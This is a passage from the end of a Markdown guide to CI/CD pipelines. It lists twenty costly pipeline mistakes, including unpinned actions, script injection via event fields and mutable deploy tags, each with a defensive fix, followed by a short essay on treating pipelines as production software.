| An ephemeral build agent in K8s | ⚠️ not native | ⚠️ the ARC operator (an extra component) | ⭐⭐ NATIVE — the killer feature |
| A self-hosted runner | an agent pool + `./config.sh` | a runner + `./config.sh`, or ARC | ⭐ the controller IS self-hosted |
| Air-gapped operation | ⛔ SaaS | ⛔ SaaS | ⭐ the only option |

---

<a name="17--the-20-mistakes-that-cost-the-most"></a>
## 17 · The 20 mistakes that cost the most

| # | The mistake | The cost | The fix |
|---|---|---|---|
| **1** | ⛔ **Building a separate artifact per environment** | You ship something you never tested | Build once; promote the **same digest** (§4) |
| **2** | ⛔ **Deploying by a mutable tag** (`:latest`, `:staging`) | Rollback becomes impossible; you don't know what's running | Deploy by **`@sha256:…`** digest |
| **3** | ⛔ **Long-lived cloud credentials in CI secrets** | A leaked PAT/AK gives permanent production access | ⭐ **OIDC / Workload Identity Federation** (§6) |
| **4** | ⛔ **`pull_request_target` + checking out PR code** ("pwn request") | Full repository and secret compromise from a public PR | Never mix the two; use the two-workflow pattern (§12) |
| **5** | ⛔ **Interpolating `${{ github.event.* }}` into `run:`** | Script injection → secret exfiltration via a PR title | Put it in `env:` and let the shell expand it (§12) |
| **6** | ⛔ **A self-hosted runner on a public repo** | Arbitrary persistent code execution on your infrastructure | Never. Or ephemeral + fork-PR approval (§12) |
| **7** | ⛔ **Actions/plugins referenced by tag or branch** | A compromised upstream runs with your secrets | ⭐ Pin to a **commit SHA**; let Renovate update it (§11) |
| **8** | ⛔ **`permissions: write-all` (the default in old repos)** | Any step can push code, delete branches, publish packages | `permissions: {}` at the top; grant per job (§12) |
| **9** | ⛔ **No branch protection / no CODEOWNERS on the pipeline files** | Anyone who can open a PR can change what deploys to production | ⭐ CODEOWNERS on `.github/workflows/`, `Jenkinsfile`, `azure-pipelines.yml` (§7) |
| **10** | ⛔ **`maxUnavailable: 1` on a rolling deploy** | 502s on every deploy for a few seconds | `maxUnavailable: 0`, `maxSurge: 1`, plus a **`preStop` sleep** (§9) |
| **11** | ⛔ **No smoke test after deploy** | The pipeline is green, the service is down | ⭐ `scripts/smoke-test.sh` asserting real endpoints (§5.5) |
| **12** | ⛔ **Helm upgrade without `--atomic`/`--wait`** | A failed upgrade leaves a half-applied release and no automatic recovery | `helm upgrade --atomic --timeout 10m` (§9) |
| **13** | ⛔ **A pipeline so slow nobody waits for it** | People merge on red; CI becomes theatre | ⭐ Cache, parallelise, path-filter, split the PR loop from the main loop (§13) |
| **14** | ⛔ **Flaky tests left unfixed** | The team learns to click "re-run"; a real failure gets re-run too | Quarantine → ticket → fix in 2 weeks → **delete** (§5.4) |
| **15** | ⛔ **All the logic in the CI YAML** | The pipeline is unmigratable, untestable and unreadable | ⭐ Logic in **scripts**; the pipeline just calls them (§16) |
| **16** | ⛔ **A schema migration in the same release as the code that uses it** | Blue-green/canary/rolling all break; rollback fails | Expand → migrate → contract, across three releases (§9.4) |
| **17** | ⛔ **Nobody can answer "what's in production right now?"** | Every incident starts with 20 minutes of archaeology | GitOps, or an environment with deployment history (§10) |
| **18** | ⛔ **No rollback rehearsal** | The first real rollback happens during the worst incident of the year | ⭐ Rehearse monthly. Time it. It should be under 60 seconds. |
| **19** | ⛔ **Pipeline changes aren't reviewed like code** | A "small YAML tweak" takes down production | PR + review + CODEOWNERS on the pipeline files, always (§7) |
| **20** | ⛔ **Jenkins artifacts archived to the controller's disk** | The controller fills up and dies at 3 a.m. | Archive to S3/Artifactory; set `buildDiscarder` on every job (§4.4) |

### The meta-mistake

> ⭐⭐ **Treating the pipeline as plumbing rather than as production software.**
>
> Your pipeline has more privilege than any human on your team. It can read every secret, build and run arbitrary code, publish to your registry, and deploy to production — and it does so automatically, hundreds of times a day, with no one watching.
>
> So it deserves what production software gets: **version control, code review, tests, least-privilege access, an SBOM, signed artifacts, monitoring, an on-call owner, and a rollback plan.**
>
> The teams that get this right have pipelines they trust enough to deploy on a Friday. The teams that don't have a "no deploys on Friday" rule and call it culture.

---

## Where next

| You want | Go to |
|---|---|
| ⭐ Hour-by-hour plan for all three cases | [00-ONE-DAY-MASTER-PLAN.md](./00-ONE-DAY-MASTER-PLAN.md) |
| 🔷 Case 1 — Azure DevOps, end to end | [02-CASE-1-azure-devops.md](./02-CASE-1-azure-devops.md) |
| 🐙 Case 2 — GitHub Actions, end to end | [03-CASE-2-github-actions.md](./03-CASE-2-github-actions.md) |
| 🔨 Case 3 — Jenkins, end to end | [04-CASE-3-jenkins.md](./04-CASE-3-jenkins.md) |
| 🏆 The capstone: all three + GitOps + progressive delivery | [05-CAPSTONE-END-TO-END.md](./05-CAPSTONE-END-TO-END.md) |
| ⚡ Everything on one page | [06-CHEATSHEET.md](./06-CHEATSHEET.md) |

---

<div align="center">

**Created by Harish Kumar Brahmandam**

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Harish_Kumar_Brahmandam-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/harish-kumar-brahmandam-b38a88260)
[![GitHub](https://img.shields.io/badge/GitHub-3558Bhk-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/3558Bhk)

🔗 LinkedIn: https://www.linkedin.com/in/harish-kumar-brahmandam-b38a88260
🔗 GitHub: https://github.com/3558Bhk

*Built for engineers who learn by breaking things on purpose.*

</div>
